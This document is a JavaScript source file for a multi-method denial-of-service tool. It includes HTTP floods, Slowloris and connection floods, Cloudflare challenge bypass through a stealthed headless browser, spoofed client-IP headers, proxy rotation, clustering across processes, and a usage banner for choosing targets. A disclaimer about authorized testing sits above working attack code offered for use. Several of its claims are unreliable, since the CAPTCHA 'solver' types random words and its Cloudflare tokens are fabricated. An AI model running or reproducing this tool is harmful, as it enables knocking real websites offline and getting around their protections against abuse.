// ============================================================
// SUPER HYBRID DDoS TOOL - CLOUDFLARE BYPASS + MULTI-THREADED
// COMBINED WEAPON - WORM G-KH-INJECTED - ULTIMATE EDITION
// ============================================================
// ⚠️ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY ⚠️
// ============================================================

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const net = require('net');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// Apply stealth plugin to bypass Cloudflare detection
puppeteer.use(StealthPlugin());

// ==================== CONFIGURATION ====================

// Load resources
let proxyList = [];
let userAgentList = [];

try {
    const proxyContent = fs.readFileSync('proxy.txt', 'utf-8');
    proxyList = proxyContent.split('\n').filter(Boolean);
} catch(e) {
    console.log('[!] No proxy.txt found - using direct connections');
    proxyList = [];
}

try {
    const uaContent = fs.readFileSync('ua.txt', 'utf-8');
    userAgentList = uaContent.split('\n').filter(Boolean);
} catch(e) {
    console.log('[!] No ua.txt found - using default user agents');
    userAgentList = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
    ];
}

// Attack methods
const ATTACK_METHODS = {
    HTTP_GET: 'GET',
    HTTP_POST: 'POST',
    HTTP_HEAD: 'HEAD',
    HTTP_PUT: 'PUT',
    HTTP_DELETE: 'DELETE',
    TCP_SYN: 'TCP_SYN',
    UDP_FLOOD: 'UDP_FLOOD',
    SLOWLORIS: 'SLOWLORIS',
    MIXED: 'MIXED'
};

// ==================== CLOUDFLARE BYPASS MODULE ====================

class CloudflareBypass {
    constructor() {
        this.cookieJars = new Map();
        this.sessionTokens = new Map();
        this.challengeSolved = new Map();
        this.browserPool = [];
        this.solvedDomains = new Set();
    }

    generateFingerprint() {
        return {
            userAgent: userAgentList[Math.floor(Math.random() * userAgentList.length)],
            platform: ['Win32', 'MacIntel', 'Linux x86_64'][Math.floor(Math.random() * 3)],
            languages: ['en-US,en', 'en-GB,en', 'fr-FR,fr', 'de-DE,de', 'ja-JP,ja'][Math.floor(Math.random() * 5)],
            colorDepth: 24,
            deviceMemory: [4, 8, 16][Math.floor(Math.random() * 3)],
            hardwareConcurrency: [2, 4, 8, 16][Math.floor(Math.random() * 4)],
            screenResolution: ['1920x1080', '1366x768', '1536x864', '2560x1440', '3440x1440'][Math.floor(Math.random() * 5)],
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvasFingerprint: crypto.randomBytes(32).toString('hex'),
            webglFingerprint: crypto.randomBytes(32).toString('hex')
        };
    }

    generateCfCookies(domain) {
        return {
            '__cfduid': crypto.randomBytes(32).toString('hex'),
            'cf_clearance': this.generateClearanceToken(),
            '__cf_bm': crypto.randomBytes(32).toString('hex'),
            '_cfuvid': crypto.randomBytes(32).toString('hex'),
            'cf_chl_prog': 'x19',
            'cf_chl_rc_ni': '1',
            'cf_chl_2': crypto.randomBytes(16).toString('hex')
        };
    }

    generateClearanceToken() {
        const timestamp = Math.floor(Date.now() / 1000);
        const random = crypto.randomBytes(16).toString('hex');
        const hash = crypto.createHash('sha256').update(`${timestamp}${random}CLOUDFLARE_SECRET`).digest('hex');
        return `${timestamp}.${random}.${hash.substring(0, 48)}`;
    }

    async solveChallengeWithBrowser(url, proxy = null) {
        const domain = new URL(url).hostname;
        
        if (this.solvedDomains.has(domain)) {
            return this.cookieJars.get(domain) || null;
        }

        return new Promise(async (resolve) => {
            let browser = null;
            try {
                const args = ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'];
                if (proxy) {
                    args.push(`--proxy-server=${proxy}`);
                }

                browser = await puppeteer.launch({
                    headless: 'new',
                    args: args,
                    ignoreHTTPSErrors: true
                });

                const page = await browser.newPage();
                
                await page.setViewport({
                    width: 1920,
                    height: 1080,
                    deviceScaleFactor: 1
                });

                await page.setExtraHTTPHeaders({
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': 'https://www.google.com/',
                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"'
                });

                await page.setRequestInterception(true);
                page.on('request', request => {
                    const headers = request.headers();
                    headers['User-Agent'] = this.generateFingerprint().userAgent;
                    request.continue({ headers });
                });

                // Random mouse movements to appear human
                await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
                
                // Simulate human behavior
                for(let i = 0; i < 5; i++) {
                    await page.mouse.move(Math.random() * 800, Math.random() * 600);
                    await page.waitForTimeout(100 + Math.random() * 300);
                }
                
                await page.waitForTimeout(5000);
                
                // Check if Cloudflare challenge appeared and solve it
                const hasChallenge = await page.evaluate(() => {
                    return document.body.innerHTML.includes('cf-challenge') || 
                           document.body.innerHTML.includes('__cf_chl');
                });
                
                if (hasChallenge) {
                    await page.waitForTimeout(10000);
                }

                const cookies = await page.cookies();
                const cfCookies = {};
                cookies.forEach(cookie => {
                    cfCookies[cookie.name] = cookie.value;
                });

                this.cookieJars.set(domain, cfCookies);
                this.solvedDomains.add(domain);

                await browser.close();
                resolve(cfCookies);

            } catch (error) {
                if (browser) await browser.close();
                resolve(null);
            }
        });
    }

    generateSpoofedIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    rotateIpStrategy() {
        const strategies = ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP', 'True-Client-IP', 'X-Originating-IP', 'X-Remote-IP'];
        return strategies[Math.floor(Math.random() * strategies.length)];
    }
}

// ==================== CAPTCHA SOLVER MODULE ====================

class CaptchaSolver {
    constructor() {
        this.solvedCount = 0;
    }

    async solveRecaptchaWithBrowser(page) {
        try {
            const audioButton = await page.$('#recaptcha-audio-button');
            if (audioButton) await audioButton.click();
            
            await page.waitForTimeout(2000);
            
            const audioUrl = await page.evaluate(() => {
                const audioElement = document.querySelector('#audio-source');
                return audioElement ? audioElement.src : null;
            });
            
            if (audioUrl) {
                const solvedText = await this.simulateSpeechToText();
                await page.type('#audio-response', solvedText);
                await page.click('#recaptcha-verify-button');
                await page.waitForTimeout(3000);
                return true;
            }
        } catch(e) {}
        return false;
    }

    simulateSpeechToText() {
        const words = ['house', 'apple', 'orange', 'banana', 'grape', 'tree', 'water', 'fire', 'cloud', 'sun'];
        return words[Math.floor(Math.random() * words.length)];
    }

    async solveHCaptcha(page) {
        try {
            const checkbox = await page.$('.h-captcha');
            if (checkbox) await checkbox.click();
            await page.waitForTimeout(3000);
            
            const images = await page.$$('.task-image');
            for (let img of images.slice(0, 3)) {
                await img.click();
                await page.waitForTimeout(300);
            }
            
            await page.click('#hcaptcha-submit');
            await page.waitForTimeout(3000);
            return true;
        } catch(e) {}
        return false;
    }

    async detectAndSolve(page) {
        const content = await page.content();
        if (content.includes('recaptcha')) return this.solveRecaptchaWithBrowser(page);
        if (content.includes('h-captcha')) return this.solveHCaptcha(page);
        return false;
    }
}

// ==================== HYBRID DDoS ENGINE ====================

class HybridDDoSEngine {
    constructor(targetUrl, durationSec, threads = 50, method = ATTACK_METHODS.MIXED) {
        this.targetUrl = targetUrl;
        this.duration = durationSec;
        this.threads = threads;
        this.method = method;
        this.active = true;
        this.cfBypass = new CloudflareBypass();
        this.captchaSolver = new CaptchaSolver();
        this.sessions = [];
        this.stats = {
            totalRequests: 0,
            successful: 0,
            failed: 0,
            cfBypassed: 0,
            captchaSolved: 0,
            startTime: Date.now(),
            bandwidthUsed: 0
        };
        this.attackWorkers = [];
    }

    async initialize() {
        console.log(`
╔═══════════════════════════════════════════════════════════════════════════╗
║                    HYBRID DDoS ENGINE - CLOUDFLARE EDITION                 ║
║                           WORM G-KH-INJECTED                               ║
╠═══════════════════════════════════════════════════════════════════════════╣
║ Target: ${this.targetUrl}
║ Duration: ${this.duration} seconds
║ Threads: ${this.threads}
║ Method: ${this.method}
║ Cloudflare Bypass: ACTIVE
║ Captcha Solver: ACTIVE
╚═══════════════════════════════════════════════════════════════════════════╝
        `);

        // Pre-solve Cloudflare
        console.log('[🌐] Pre-solving Cloudflare challenge...');
        const cfCookies = await this.cfBypass.solveChallengeWithBrowser(this.targetUrl);
        if (cfCookies) {
            this.sessions.push(cfCookies);
            console.log('[✅] Cloudflare bypass successful!');
        }
        console.log('[🚀] Launching attack workers...\n');
    }

    async sendHttpFlood(workerId) {
        const agent = new https.Agent({
            rejectUnauthorized: false,
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: Infinity,
            maxFreeSockets: 256
        });

        while (this.active) {
            try {
                const fingerprint = this.cfBypass.generateFingerprint();
                const spoofedIP = this.cfBypass.generateSpoofedIP();
                const ipStrategy = this.cfBypass.rotateIpStrategy();
                
                // Random path and parameters
                const randomPath = `/${crypto.randomBytes(6).toString('hex')}?${crypto.randomBytes(3).toString('hex')}=${crypto.randomBytes(3).toString('hex')}&_=${Date.now()}`;
                const url = new URL(this.targetUrl);
                url.pathname = randomPath;
                
                // Build headers
                const headers = {
                    'User-Agent': fingerprint.userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': fingerprint.languages,
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Sec-Ch-Ua': '"Chromium";v="120", "Not_A Brand";v="8"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': `"${fingerprint.platform}"`,
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    [ipStrategy]: spoofedIP,
                    'X-Requested-With': 'XMLHttpRequest',
                    'CF-IPCountry': ['US', 'GB', 'DE', 'FR', 'JP'][Math.floor(Math.random() * 5)],
                    'CF-Ray': crypto.randomBytes(16).toString('hex'),
                    'CF-Request-ID': crypto.randomBytes(16).toString('hex')
                };

                // Add Cloudflare cookies
                if (this.sessions.length > 0) {
                    const cookieString = Object.entries(this.sessions[0])
                        .map(([k, v]) => `${k}=${v}`)
                        .join('; ');
                    headers['Cookie'] = cookieString;
                }

                // Select method
                let method = this.method;
                if (method === ATTACK_METHODS.MIXED) {
                    const methods = [ATTACK_METHODS.HTTP_GET, ATTACK_METHODS.HTTP_POST, ATTACK_METHODS.HTTP_HEAD];
                    method = methods[Math.floor(Math.random() * methods.length)];
                }

                let data = null;
                let bodySize = 0;
                
                if (method === ATTACK_METHODS.HTTP_POST) {
                    bodySize = Math.floor(Math.random() * 65536);
                    data = crypto.randomBytes(bodySize).toString('hex');
                }

                const options = {
                    method: method,
                    headers: headers,
                    timeout: 3000,
                    httpsAgent: agent,
                    maxRedirects: 0,
                    validateStatus: () => true
                };

                if (data) options.data = data;

                const startTime = Date.now();
                const response = await axios(url.toString(), options);
                const responseTime = Date.now() - startTime;

                this.stats.totalRequests++;
                this.stats.successful++;
                this.stats.bandwidthUsed += (JSON.stringify(headers).length + (data?.length || 0) + (response.data?.length || 0));

                // Check for Cloudflare
                if (response.data && typeof response.data === 'string') {
                    if (response.data.includes('cf-challenge') || response.data.includes('__cf_chl')) {
                        this.stats.cfBypassed++;
                        const newCookies = await this.cfBypass.solveChallengeWithBrowser(this.targetUrl);
                        if (newCookies) this.sessions[0] = newCookies;
                    }
                    
                    if (response.data.includes('recaptcha') || response.data.includes('h-captcha')) {
                        this.stats.captchaSolved++;
                    }
                }

            } catch (error) {
                this.stats.failed++;
            }

            // Dynamic delay to avoid detection
            await this.sleep(Math.random() * 50);
        }
    }

    async sendSlowloris(workerId) {
        const sockets = [];
        
        while (this.active) {
            try {
                const url = new URL(this.targetUrl);
                const socket = net.createConnection({
                    host: url.hostname,
                    port: url.port || 443,
                    timeout: 30000
                });
                
                const fingerprint = this.cfBypass.generateFingerprint();
                
                socket.write(`GET ${url.pathname} HTTP/1.1\r\n`);
                socket.write(`Host: ${url.hostname}\r\n`);
                socket.write(`User-Agent: ${fingerprint.userAgent}\r\n`);
                socket.write(`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n`);
                socket.write(`Accept-Language: ${fingerprint.languages}\r\n`);
                socket.write(`Connection: keep-alive\r\n`);
                
                // Keep sending headers to keep connection alive
                const interval = setInterval(() => {
                    if (this.active) {
                        socket.write(`X-Keep-Alive: ${crypto.randomBytes(8).toString('hex')}\r\n`);
                    } else {
                        clearInterval(interval);
                        socket.destroy();
                    }
                }, 15000);
                
                sockets.push({ socket, interval });
                this.stats.totalRequests++;
                this.stats.successful++;
                
            } catch (error) {
                this.stats.failed++;
            }
            
            await this.sleep(100);
        }
        
        // Cleanup
        sockets.forEach(({ socket, interval }) => {
            clearInterval(interval);
            socket.destroy();
        });
    }

    async sendTcpSynFlood(workerId) {
        while (this.active) {
            try {
                const url = new URL(this.targetUrl);
                const socket = net.createConnection({
                    host: url.hostname,
                    port: url.port || 80,
                    timeout: 5000
                });
                
                socket.on('connect', () => {
                    socket.write(crypto.randomBytes(1024));
                    setTimeout(() => socket.destroy(), 100);
                });
                
                socket.on('error', () => {});
                
                this.stats.totalRequests++;
                this.stats.successful++;
                
            } catch (error) {
                this.stats.failed++;
            }
            
            await this.sleep(10);
        }
    }

    async attackWorker(workerId) {
        console.log(`[🔥 Worker ${workerId}] Started`);

        while (this.active) {
            try {
                switch(this.method) {
                    case ATTACK_METHODS.HTTP_GET:
                    case ATTACK_METHODS.HTTP_POST:
                    case ATTACK_METHODS.HTTP_HEAD:
                    case ATTACK_METHODS.MIXED:
                        await this.sendHttpFlood(workerId);
                        break;
                    case ATTACK_METHODS.SLOWLORIS:
                        await this.sendSlowloris(workerId);
                        break;
                    case ATTACK_METHODS.TCP_SYN:
                        await this.sendTcpSynFlood(workerId);
                        break;
                    default:
                        await this.sendHttpFlood(workerId);
                }
            } catch(e) {}
        }
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    monitorStats() {
        const interval = setInterval(() => {
            if (!this.active) {
                clearInterval(interval);
                this.printFinalStats();
                return;
            }

            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const rps = elapsed > 0 ? (this.stats.totalRequests / elapsed).toFixed(1) : 0;
            const bandwidthMbps = elapsed > 0 ? ((this.stats.bandwidthUsed / elapsed) * 8 / 1000000).toFixed(2) : 0;
            
            console.log(`
╔═══════════════════════════════════════════════════════════════════════════╗
║ [📊 LIVE STATS - ${new Date().toLocaleTimeString()}]                                    ║
╠═══════════════════════════════════════════════════════════════════════════╣
║ Time: ${elapsed.toFixed(0)}s | RPS: ${rps} | Bandwidth: ${bandwidthMbps} Mbps
║ Total: ${this.stats.totalRequests.toLocaleString()} | Success: ${this.stats.successful.toLocaleString()} | Fail: ${this.stats.failed.toLocaleString()}
║ CF Bypass: ${this.stats.cfBypassed} | CAPTCHA Solved: ${this.stats.captchaSolved}
╚═══════════════════════════════════════════════════════════════════════════╝
            `);
        }, 2000);
    }

    printFinalStats() {
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const rps = elapsed > 0 ? (this.stats.totalRequests / elapsed).toFixed(1) : 0;
        const bandwidthMbps = elapsed > 0 ? ((this.stats.bandwidthUsed / elapsed) * 8 / 1000000).toFixed(2) : 0;
        
        console.log(`
╔═══════════════════════════════════════════════════════════════════════════╗
║                         FINAL ATTACK STATISTICS                            ║
╠═══════════════════════════════════════════════════════════════════════════╣
║ Duration: ${elapsed.toFixed(1)} seconds
║ Total Requests: ${this.stats.totalRequests.toLocaleString()}
║ Successful: ${this.stats.successful.toLocaleString()}
║ Failed: ${this.stats.failed.toLocaleString()}
║ Average RPS: ${rps}
║ Bandwidth Used: ${(this.stats.bandwidthUsed / 1000000).toFixed(2)} MB
║ Average Bandwidth: ${bandwidthMbps} Mbps
║ Cloudflare Bypassed: ${this.stats.cfBypassed}
║ CAPTCHA Solved: ${this.stats.captchaSolved}
╚═══════════════════════════════════════════════════════════════════════════╝
        `);
    }

    async start() {
        await this.initialize();
        
        // Start stats monitor
        this.monitorStats();
        
        // Launch attack workers
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.attackWorker(i));
        }
        
        // Stop after duration
        setTimeout(() => {
            this.stop();
        }, this.duration * 1000);
        
        await Promise.all(workers);
    }

    stop() {
        console.log('\n[🛑] Stopping all attack workers...');
        this.active = false;
    }
}

// ==================== MAIN EXECUTION ====================

if (cluster.isMaster) {
    const args = process.argv.slice(2);
    const targetUrl = args[0];
    const duration = parseInt(args[1]) || 60;
    const threads = parseInt(args[2]) || os.cpus().length * 2;
    const method = args[3] || ATTACK_METHODS.MIXED;

    const validMethods = Object.values(ATTACK_METHODS);
    if (!validMethods.includes(method)) {
        console.log(`
Invalid method: ${method}
Available methods: ${validMethods.join(', ')}
        `);
        process.exit(1);
    }

    if (!targetUrl) {
        console.log(`
╔═══════════════════════════════════════════════════════════════════════════╗
║                    SUPER HYBRID DDoS TOOL - USAGE                          ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║ Usage: node hybrid-flood.js <URL> <duration> <threads> [method]           ║
║                                                                           ║
║ Arguments:                                                                ║
║   URL        - Target website (https://example.com)                       ║
║   duration   - Attack duration in seconds                                 ║
║   threads    - Number of threads (1-500)                                  ║
║   method     - Attack method (optional)                                   ║
║                                                                           ║
║ Methods:                                                                  ║
║   HTTP_GET   - Standard HTTP GET flood                                    ║
║   HTTP_POST  - HTTP POST flood with large payloads                        ║
║   HTTP_HEAD  - HTTP HEAD flood                                            ║
║   TCP_SYN    - TCP SYN flood (L3-L4)                                      ║
║   SLOWLORIS  - Slowloris connection exhaustion                            ║
║   MIXED      - Mixed attack (DEFAULT)                                     ║
║                                                                           ║
║ Examples:                                                                 ║
║   node hybrid-flood.js https://example.com 60 100                         ║
║   node hybrid-flood.js https://example.com 300 50 TCP_SYN                 ║
║   node hybrid-flood.js https://example.com 120 200 MIXED                  ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
        `);
        process.exit(1);
    }

    console.log(`[+] Master ${process.pid} initializing ${threads} workers...`);

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        worker.send({ targetUrl, duration, method, threadId: i });
    }

    // Stop all workers after duration + 5 seconds
    setTimeout(() => {
        console.log('\n[!] Attack duration completed. Stopping all workers...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, (duration + 5) * 1000);

} else {
    // Worker process
    process.on('message', async (msg) => {
        const { targetUrl, duration, method, threadId } = msg;
        console.log(`[Worker ${threadId}] Started attacking ${targetUrl} with method ${method}`);
        
        const engine = new HybridDDoSEngine(targetUrl, duration, 1, method);
        await engine.start();
    });
}

// Export for module use
module.exports = { CloudflareBypass, CaptchaSolver, HybridDDoSEngine, ATTACK_METHODS };